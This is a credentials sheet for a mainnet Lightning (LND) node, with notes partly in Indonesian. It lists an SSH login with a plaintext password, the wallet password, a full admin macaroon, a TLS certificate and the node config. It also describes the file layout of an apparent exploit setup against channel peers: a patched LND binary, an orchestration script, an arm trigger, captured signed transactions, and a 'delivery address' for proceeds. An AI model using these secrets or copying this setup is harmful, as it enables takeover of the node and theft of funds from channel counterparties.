# VPS2 LND Wallet Keys & Credentials
## Date: 2026-10-21

## NODE INFO
- **IP:** 47.250.182.84
- **SSH:** janda@47.250.182.84 password: janda354@
- **Pubkey:** 022d92cb73ee2ab5b9926dfd5ef1ce247ef06d768ed4cc860a62a99b25ce0cb7a1
- **Alias:** ln-relay-sg
- **LND Version:** 0.18.5-beta (patched lnd-debug)
- **Network:** mainnet
- **Binary:** /tmp/lnd-0.18.5-beta/lnd-debug
- **lncli:** /tmp/lncli --lnddir=/tmp/.lnd --network=mainnet

## WALLET
- **Password:** janda354@
- **Wallet DB:** /tmp/.lnd/data/chain/bitcoin/mainnet/wallet.db
- **LND Dir:** /tmp/.lnd/
- **SEED PHRASE:** ❌ TIDAK ADA — wallet dibuat dengan --noseedbackup
- **⚠️ seed.bak di /tmp/drain_1/ = wallet LAIN (drain_1), BUKAN wallet utama!**
- **RECOVERY:** Gunakan wallet.db backup + password janda354@
  1. Copy wallet.db ke LND lain → unlock dengan password → akses funds
  2. wallet.db HARUS dijaga — hilang = dana HILANG
- **LOCAL BACKUP:** /home/kali/Downloads/lqwd-LND DEPLOYED/wallet-backup/wallet.db + channel.backup

## FUNDING ADDRESSES
- **p2wkh:** bc1qtzysskq20e5jjhkg22hy35jl82ed8g26p8pxq2
- **p2wkh (alt):** bc1qrjpl8zkuk2d82qj0n65p52wmsejvepaw3klgd0
- **np2wkh:** 3NuogAEW5MBp5SQKHttJujuGHjuRgGk1tf
- **Original (exploit-notes):** bc1qs8j8278j404k5s04443jftncq6838akd5ylsgh

## ADMIN MACAROON (HEX)
```
0201036c6e6402f801030a106eaebb50f7bc27d01b5f27977409402a1201301a160a0761646472657373120472656164120577726974651a130a04696e666f120472656164120577726974651a170a08696e766f69636573120472656164120577726974651a210a086d616361726f6f6e120867656e6572617465120472656164120577726974651a160a076d657373616765120472656164120577726974651a170a086f6666636861696e120472656164120577726974651a160a076f6e636861696e120472656164120577726974651a140a057065657273120472656164120577726974651a180a067369676e6572120867656e6572617465120472656164000006207e7b6f47e57f74b02f16b4dae316bffaac0b14ae6f675d371a901ab05d4958f0
```

## TLS CERT
```
-----BEGIN CERTIFICATE-----
MIICcjCCAhigAwIBAgIQchizMxxFR98Irw7OTfd0MzAKBggqhkjOPQQDAjBDMR8w
HQYDVQQKExZsbmQgYXV0b2dlbmVyYXRlZCBjZXJ0MSAwHgYDVQQDExdpWjhwc2c2
dW85ZXV2aTk3MzlzajlwWjAeFw0yNjEwMTcwMDI2MjBaFw0yNzEyMTIwMDI2MjBa
MEMxHzAdBgNVBAoTFmxuZCBhdXRvZ2VuZXJhdGVkIGNlcnQxIDAeBgNVBAMTF2la
OHBzZzZ1bzlldXZpOTczOXNqOXBaMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE
6zvXBVvK6/2kVu49RL8IbQrGv98Gw3iGDaoUej0wUW3QUleOF2Ml7M0ijrw2vcof
oPlssXqJIvxhcLUVRqbkA6OB7TCB6jAOBgNVHQ8BAf8EBAMCAqQwEwYDVR0lBAww
CgYIKwYBBQUHAwEwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQUVwo3m2gHDdRD
ukvnsszV3XfyvRcwgZIGA1UdEQSBijCBh4IXaVo4cHNnNnVvOWV1dmk5NzM5c2o5
cFqCCWxvY2FsaG9zdIIEdW5peIIKdW5peHBhY2tldIIHYnVmY29ubocEfwAAAYcQ
AAAAAAAAAAAAAAAAAAAAAYcErBz8rocErBEAAYcQ/oAAAAAAAAACFj7//gBj3IcQ
/oAAAAAAAADslYf//s12XTAKBggqhkjOPQQDAgNIADBFAiEArDLC4f7zfLrnXtbF
tmo1/tgUAIZffuB4tLqouHVerbwCIBhQmSG0+1/4AGVMZAS0+YtBPwxowQSfOLc1
qgiAXRIH
-----END CERTIFICATE-----
```

## LND.CONF
```
[Application Options]
fee.url=https://nodes.lightning.computer/fees/v1/btc-fee-estimates.json
listen=0.0.0.0:9735
rpclisten=0.0.0.0:10009
restlisten=0.0.0.0:8089
alias=ln-relay-sg
externalhosts=47.250.182.84:9735
maxpendingchannels=10
minchansize=20000
accept-keysend=true

[Bitcoin]
bitcoin.active=true
bitcoin.mainnet=true
bitcoin.node=neutrino

[Neutrino]
neutrino.connect=bb2.breez.technology
neutrino.connect=btcd.lnolymp.us
neutrino.connect=node.eldamar.icu
neutrino.connect=node.blixtwallet.com

[protocol]
protocol.wumbo-channels=true

[wtclient]
wtclient.active=false
```

## EXPLOIT FILES (on VPS2)
- Binary: /tmp/lnd-0.18.5-beta/lnd-debug (77.6MB patched)
- lncli-debug: /tmp/lnd-0.18.5-beta/lncli-debug
- lncli: /tmp/lncli (original)
- Orchestration: /tmp/exploit_orchestrate.sh
- Trigger: /tmp/.exploit_armed (touch=arm, rm=disarm)
- TX capture: /tmp/exploit_signed_tx.hex
- TX ready signal: /tmp/.exploit_tx_ready
- Commitment log: /tmp/exploit_commitments.log
- LND log: /tmp/lnd-exploit.log

## RECOVERY
- Wallet password: janda354@
- Unlock: echo 'janda354@' | lncli unlock --stdin
- Start: nohup /tmp/lnd-0.18.5-beta/lnd-debug --lnddir=/tmp/.lnd > /tmp/lnd-exploit.log 2>&1 &
- If channel stuck: lncli closechannel --force FUNDING_TXID OUTPUT_INDEX
- Delivery address Tuan: bc1qehphy4pr6gy2vfzev28q846gcltz5amy4n2ygz
